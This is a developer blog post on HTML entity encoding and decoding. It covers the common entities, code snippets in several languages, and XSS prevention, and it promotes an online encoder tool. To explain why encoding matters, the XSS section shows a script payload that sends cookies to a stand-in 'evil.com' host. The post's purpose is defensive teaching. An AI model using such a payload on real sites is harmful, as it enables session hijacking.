---
title: "HTML Encoder Decoder Online: Escape & Unescape HTML Entities Free"
description: "Encode and decode HTML entities online for free. Learn when to escape HTML, which characters must be encoded, and how to prevent XSS vulnerabilities using an HTML encoder decoder."
date: "2026-03-24"
tags: ["html", "encoder", "decoder", "entities", "security", "xss", "developer-tools"]
readingTime: "6 min read"
---

# HTML Encoder Decoder Online: Escape & Unescape HTML Entities Free

HTML encoding converts special characters like `<`, `>`, `&`, and `"` into their HTML entity equivalents (`&lt;`, `&gt;`, `&amp;`, `&quot;`). This prevents browsers from misinterpreting them as HTML tags and is a critical defense against cross-site scripting (XSS) attacks.

An HTML encoder/decoder online tool handles this conversion instantly — no code, no terminal, just paste and convert.

---

## What Are HTML Entities?

HTML entities are codes that represent special characters in HTML. When a browser encounters `&lt;` in HTML source, it renders the `<` character — but doesn't treat it as the start of a tag.

**Common HTML entities:**

| Character | Entity | Description |
|-----------|--------|-------------|
| `<` | `&lt;` | Less-than (opens HTML tag) |
| `>` | `&gt;` | Greater-than (closes HTML tag) |
| `&` | `&amp;` | Ampersand (starts entity) |
| `"` | `&quot;` | Double quote (inside attributes) |
| `'` | `&#39;` or `&apos;` | Single quote |
| ` ` | `&nbsp;` | Non-breaking space |
| `©` | `&copy;` | Copyright symbol |
| `™` | `&trade;` | Trademark symbol |
| `→` | `&rarr;` | Right arrow |

**Try it now:** [DevPlaybook HTML Entity Encoder](https://devplaybook.cc/tools/html-entity-encoder) — encode or decode any HTML content instantly.

---

## Why HTML Encoding Matters

### 1. Preventing XSS Attacks

Cross-site scripting (XSS) is one of the most common web vulnerabilities. If user input is rendered as raw HTML without encoding, an attacker can inject malicious scripts:

```html
<!-- User submits this as their "name" -->
<script>document.location='https://evil.com?cookie='+document.cookie</script>

<!-- If rendered without encoding: -->
<p>Hello, <script>document.location='...'</script></p>  <!-- script executes! -->

<!-- If rendered WITH encoding: -->
<p>Hello, &lt;script&gt;document.location='...'&lt;/script&gt;</p>  <!-- safe text -->
```

### 2. Displaying Code in HTML

If you're building a documentation site, blog, or code editor that shows HTML or code snippets, you must encode them so they render as text rather than being parsed as HTML:

```html
<!-- Without encoding -->
<p>To create a link, use <a href="...">...</a></p>
<!-- Browser renders the link tag, not the text! -->

<!-- With encoding -->
<p>To create a link, use &lt;a href="..."&gt;...&lt;/a&gt;</p>
<!-- Browser displays the text as written -->
```

### 3. Data in HTML Attributes

Special characters in attribute values can break HTML structure or create injection vulnerabilities:

```html
<!-- Dangerous: user-controlled value with unescaped quote -->
<input value="He said "hello"">  <!-- breaks the attribute -->

<!-- Safe: encoded -->
<input value="He said &quot;hello&quot;">
```

---

## How to Use an HTML Encoder/Decoder Online

1. **Open** [DevPlaybook HTML Entity Encoder](https://devplaybook.cc/tools/html-entity-encoder)
2. **Choose mode** — Encode (text → entities) or Decode (entities → text)
3. **Paste your content** into the input area
4. **Click Convert** or see the result update in real time
5. **Copy** the output and use it in your HTML or application

---

## HTML Encoding in Code

### JavaScript

```javascript
// Encoding (escaping) HTML
function encodeHTML(str) {
  const div = document.createElement('div');
  div.appendChild(document.createTextNode(str));
  return div.innerHTML;
}

// Or manually
function escapeHTML(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

// Decoding (unescaping)
function decodeHTML(str) {
  const div = document.createElement('div');
  div.innerHTML = str;
  return div.textContent;
}
```

### Python

```python
import html

# Encoding
encoded = html.escape('<script>alert("xss")</script>')
# Result: '&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;'

# Decoding
decoded = html.unescape('&lt;b&gt;Hello&lt;/b&gt;')
# Result: '<b>Hello</b>'

# Also escape single quotes
encoded = html.escape('<script>', quote=True)
```

### Node.js

```javascript
// Using 'he' library (recommended)
const he = require('he');

he.encode('<div class="greeting">Hello</div>');
// → '&lt;div class=&quot;greeting&quot;&gt;Hello&lt;/div&gt;'

he.decode('&lt;b&gt;Hello&lt;/b&gt;');
// → '<b>Hello</b>'
```

### PHP

```php
// Encoding
$encoded = htmlspecialchars('<script>alert("xss")</script>', ENT_QUOTES, 'UTF-8');

// Decoding
$decoded = htmlspecialchars_decode('&lt;b&gt;Hello&lt;/b&gt;', ENT_QUOTES);

// Full entity encoding (including non-ASCII)
$encoded = htmlentities('<div>café</div>', ENT_QUOTES, 'UTF-8');
```

---

## Encode vs Escape vs Sanitize

These terms are related but distinct:

| Operation | What It Does | When to Use |
|-----------|-------------|-------------|
| **Encode** | Converts characters to entity codes | Displaying user input as text |
| **Escape** | Makes characters safe for a specific context | Inserting into HTML, attributes, JS, SQL |
| **Sanitize** | Strips or transforms unsafe content | Allowing limited HTML from users |

If you're allowing users to submit **some** HTML (like a rich text editor), encoding everything would strip valid formatting. Use a sanitizer library (`DOMPurify` for JS, `bleach` for Python) to allow a whitelist of safe tags while removing dangerous ones.

---

## Special Cases

### Encoding Inside JavaScript Strings in HTML

When embedding JavaScript strings inside HTML event attributes, you need double-escaping:

```html
<!-- First JS-escape the string, then HTML-encode -->
<button onclick="alert('It&apos;s working')">Click me</button>
```

### URLs vs HTML Encoding

URL encoding (`%20`, `%3C`) is different from HTML encoding. A URL inside an HTML attribute needs **both**:

```html
<!-- URL-encode the query param, then HTML-encode the & -->
<a href="/search?q=hello+world&amp;type=article">Search</a>
```

### JSON in HTML Data Attributes

When embedding JSON in `data-*` attributes, encode quotes:

```html
<div data-config='{"name":"Alice","role":"admin"}'></div>
<!-- If using double quotes for the attribute: -->
<div data-config="{&quot;name&quot;:&quot;Alice&quot;}"></div>
```

---

## Frequently Asked Questions

### When should I NOT encode HTML?

When you intentionally want HTML to render as markup — for example, when outputting HTML from a trusted source (your own templates, CMS, or database field that has already been sanitized). Only encode output that comes from external or user-provided sources.

### Is HTML encoding the same as URL encoding?

No. HTML encoding converts characters to HTML entities (`<` → `&lt;`). URL encoding converts characters to percent-encoding (`<` → `%3C`). They're used in different contexts and are not interchangeable.

### Does encoding prevent all XSS?

Encoding user input before rendering it in HTML context prevents reflected and stored XSS. But XSS has multiple contexts — you need different escaping for HTML, attributes, JavaScript, CSS, and URL contexts. Use a security library that handles context-aware escaping rather than one encoding function for everything.

### What's the difference between `&amp;` and `&#38;`?

Both represent the `&` character. `&amp;` is the named entity; `&#38;` is the decimal numeric character reference. Both are valid HTML and render identically. Named entities are more readable; numeric references work when the named entity might not be recognized.

### What about Unicode characters — do I need to encode them?

In HTML5 with UTF-8 charset declaration, you can use Unicode characters directly:

```html
<meta charset="UTF-8">
```

With that declaration, you don't need to encode `©` as `&copy;` — you can write `©` directly. However, encoding is still required for characters that have HTML meaning (`<`, `>`, `&`, `"`).

---

## Related Tools

- [URL Encoder/Decoder](https://devplaybook.cc/tools/url-encoder) — encode URL parameters and query strings
- [JSON Formatter](https://devplaybook.cc/tools/json-formatter) — format and validate JSON data
- [Markdown to HTML Converter](https://devplaybook.cc/tools/markdown-preview) — convert Markdown to HTML output
